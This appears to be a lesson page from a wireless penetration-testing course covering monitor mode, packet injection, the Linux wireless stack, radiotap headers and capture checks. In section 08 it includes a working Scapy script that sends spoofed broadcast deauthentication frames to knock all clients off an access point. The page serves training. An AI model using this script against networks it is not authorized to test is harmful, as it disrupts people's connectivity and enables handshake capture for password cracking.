Monitor Mode & Packet Injection

Enable your adapter to see every frame in range and inject arbitrary 802.11 frames — the two foundational capabilities that every attack in this course depends on.

Beginner
~45 min
Adapter required

Legal Notice: Monitor mode and injection must only be used on networks you own or have explicit written authorization to test. Unauthorized wireless interception is a federal crime in most jurisdictions.

01 Managed vs. Monitor Mode — Frame Filtering

In managed mode, the hardware silently discards all frames not addressed to your MAC. Monitor mode removes this filter entirely. Click between the two modes to see what gets through.

🔒 Managed Mode DEFAULT

Beacon (AP broadcast)BLOCKED
Probe Request (client)BLOCKED
Other clients' dataBLOCKED
EAPOL HandshakeBLOCKED
Deauth framesBLOCKED
Your own data frames✓ PASS
Broadcast frames✓ PASS
Hardware filter ON — can't capture attacks or handshakes

🔓 Monitor Mode (RFMON) ATTACK MODE

Beacon (AP broadcast)✓ CAPTURED
Probe Request (client)✓ CAPTURED
Other clients' data✓ CAPTURED
EAPOL Handshake✓ CAPTURED
Deauth frames✓ CAPTURED
Your own data frames✓ CAPTURED
Broadcast frames✓ CAPTURED
No hardware filter — every frame on-channel is visible + injectable
⚡
Why this matters: WPA2 handshake frames, deauthentication frames, probe requests leaking PNLs, WPS M1–M8 messages — all of these only become visible in monitor mode. Without it, your adapter is blind to every attack vector in this course.

02 Enabling Monitor Mode — Three Methods

Choose the method that fits your workflow. airmon-ng is recommended for most attack scenarios.

💡
Recommended: airmon-ng handles killing conflicting processes, creating the monitor interface, and naming it predictably (wlan0mon).
Method 1 — airmon-ng
# Step 1: Kill interfering processes kali@kali:~$ sudo airmon-ng check kill Killing these processes... PID Name 743 NetworkManager 891 wpa_supplicant # Step 2: Start monitor mode (optionally lock to a channel) kali@kali:~$ sudo airmon-ng start wlan0 PHY Interface Driver Chipset phy1 wlan0 88XXau Realtek RTL8812AU (monitor mode enabled on wlan0mon) # Step 3: Verify kali@kali:~$ iwconfig wlan0mon wlan0mon IEEE 802.11 Mode:Monitor Frequency:2.412 GHz Tx-Power=20 dBm # Stop monitor mode when done kali@kali:~$ sudo airmon-ng stop wlan0mon kali@kali:~$ sudo systemctl start NetworkManager
🔌
Best for scripting: iw gives precise control without renaming the interface and without killing NetworkManager automatically.
Method 2 — iw (modern)
# Interface must be down before mode change kali@kali:~$ sudo ip link set wlan0 down # Set monitor mode via cfg80211/nl80211 kali@kali:~$ sudo iw dev wlan0 set type monitor # Bring interface back up kali@kali:~$ sudo ip link set wlan0 up # Confirm type is now 'monitor' kali@kali:~$ iw dev wlan0 info Interface wlan0 ifindex 4 addr aa:bb:cc:dd:ee:ff type monitor channel 1 (2412 MHz) # Return to managed mode kali@kali:~$ sudo ip link set wlan0 down kali@kali:~$ sudo iw dev wlan0 set type managed kali@kali:~$ sudo ip link set wlan0 up
⚠
Legacy: iwconfig is deprecated but still widely used in older tutorials. Prefer iw for new scripts.
Method 3 — iwconfig (legacy)
kali@kali:~$ sudo ifconfig wlan0 down kali@kali:~$ sudo iwconfig wlan0 mode monitor kali@kali:~$ sudo ifconfig wlan0 up kali@kali:~$ iwconfig wlan0 | grep Mode Mode:Monitor # Return to managed mode kali@kali:~$ sudo ifconfig wlan0 down kali@kali:~$ sudo iwconfig wlan0 mode managed kali@kali:~$ sudo ifconfig wlan0 up

05 RFMON vs. Promiscuous Mode

These two modes are frequently confused. They operate at different layers and serve entirely different purposes.

FeatureMonitor Mode (RFMON)Promiscuous Mode
OSI LayerLayer 1 + 2Layer 2 only
Association requiredNo — completely passiveYes — must be connected
Captures management framesYes (Beacons, Deauth, Probe...)No
Captures EAPOL handshakeYesOnly your own
Frame format receivedRaw 802.11 + radiotapEthernet (802.3)
Packet injectionYesNo
Use caseAll wireless attacks in this coursePost-association wired sniffing
⚠
Common Mistake: Enabling promiscuous mode on a Wi-Fi adapter in managed mode does NOT give you monitor mode. You will still only see your own traffic. tcpdump -i wlan0 -p is not the same as tcpdump -i wlan0mon.

06 The Linux Wireless Stack: cfg80211 & mac80211

Understanding why some adapters behave differently requires knowing where each driver sits in the kernel stack.

LayerComponentRole
Userspaceiw, airmon-ng, hostapdIssue nl80211 netlink commands
Kernel APIcfg80211 via nl80211Mode changes, scan results, regulatory, power
Protocol stackmac80211Frame aggregation, QoS, rate control — used by ath9k, mt76
Vendor driver88XXau (RTL8812AU)Bypasses mac80211 → direct cfg80211; requires out-of-tree driver
HardwareWi-Fi chipsetRF, modulation, PHY layer
🔌
Why RTL8812AU behaves differently: It uses a full-MAC vendor driver that bypasses mac80211. This means injection flags like control and other_bss have different effects, and the driver must be manually installed via DKMS — it is not in the mainline kernel.

07 The Radiotap Header

Every captured and injected frame in monitor mode is prepended with a radiotap header — a variable-length metadata structure that carries PHY-layer information. Tools like aireplay-ng and scapy use it to control injection parameters.

FieldValue ExampleMeaning for Injection
Rate2 (= 1 Mbps)TX data rate. Lower = more compatible. aireplay-ng defaults to 1 Mbps.
Channel2437 MHzFrequency. Must match target AP channel.
TX Flags0x0008Don't wait for ACK — used in rapid deauth floods.
Signal-55 dBmRX signal strength (read-only in captures).
MCSMCS index 0–31802.11n HT rates (used for 802.11n injection).
Antenna0Which antenna to use (0 = auto).
💡
In Wireshark, expand any frame's IEEE 802.11 radio information section to see the full radiotap metadata — including the exact data rate, channel, and signal strength of each captured frame.

08 Scapy — Custom Frame Injection in Python

For full control over every bit in a frame — fuzzing, non-standard subtypes, automation — use Scapy. It builds the frame and radiotap header from scratch in Python.

scapy-deauth.py — Custom deauth injection
#!/usr/bin/env python3 # sudo python3 scapy-deauth.py # Requires: pip3 install scapy && interface in monitor mode from scapy.all import * from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap IFACE = "wlan0mon" AP_MAC = "AA:BB:CC:DD:EE:FF" # Target AP BSSID CLIENT = "ff:ff:ff:ff:ff:ff" # Broadcast = disconnect ALL clients frame = ( RadioTap() / # Radiotap: auto-filled (1 Mbps, 2.4 GHz) Dot11( type=0, # 0 = Management frame subtype=12, # 12 = Deauthentication addr1=CLIENT, # Receiver (victim) addr2=AP_MAC, # Transmitter: spoofed as AP addr3=AP_MAC # BSSID ) / Dot11Deauth(reason=7) # Reason 7: nonassociated STA ) sendp(frame, iface=IFACE, count=10, inter=0.1, verbose=True) # Sent 10 packets.
⚡
Attack relevance: This is the exact frame structure that aireplay-ng -0 generates internally. Writing it in Scapy teaches you the precise bit layout — critical for understanding why 802.11w (PMF) blocks it and how WPA3 defends against forged deauths.

09 Channel Hopping vs. Locking

The decision to hop or lock determines what you see. Get it wrong and you either miss the target entirely or miss frames on its channel.

ModeCoverageFrame LossWhen to Use
Hopping (airodump-ng default) All channels Miss frames during dwell elsewhere Reconnaissance phase — find targets
Locked (airmon-ng start wlan0 N) Target channel only Never miss a frame on that channel Attack phase — capture handshake, inject
Channel hopping commands
# Default hop (2.4 GHz only) kali@kali:~$ sudo airodump-ng wlan0mon # Hop both bands (requires dual-band adapter) kali@kali:~$ sudo airodump-ng --band abg wlan0mon # a = 5 GHz b/g = 2.4 GHz # kismet: simultaneous multi-channel — no frame loss kali@kali:~$ sudo kismet -c wlan0:channel=6 -c wlan1:channel=11 # Both channels monitored simultaneously with two adapters # Lock to target channel before attacking kali@kali:~$ sudo iw dev wlan0mon set channel 6

10 Verifying Capture Quality

Before any attack, confirm your adapter is actually capturing 802.11 frames — not Ethernet frames (a sign monitor mode failed).

Capture quality checks
# tcpdump: should show 802.11 management frames, NOT ethernet kali@kali:~$ sudo tcpdump -i wlan0mon -c 5 -e 12:00:01 AA:BB:CC > Broadcast, Probe Request (0) [1.0* Mbit] SSID:"" 12:00:01 DD:EE:FF > Broadcast, Beacon (8) [1.0* Mbit] SSID:"HomeNet" # ↑ Good — raw 802.11 frames with radiotap metadata # ✗ Bad: if you see ARP or IP frames = NOT in monitor mode # Wireshark filter: view only beacon frames kali@kali:~$ sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8" -c 5 1 0.000000 aa:bb:cc:dd:ee:ff → Broadcast 802.11 Beacon frame, SN=1234, FN=0 2 0.102341 aa:bb:cc:dd:ee:ff → Broadcast 802.11 Beacon frame, SN=1235, FN=0 # Count frames per type (management/control/data) kali@kali:~$ tshark -r capture.cap -q -z "io,stat,0" Management: 1248 Control: 3821 Data: 891 # All three types = healthy monitor capture
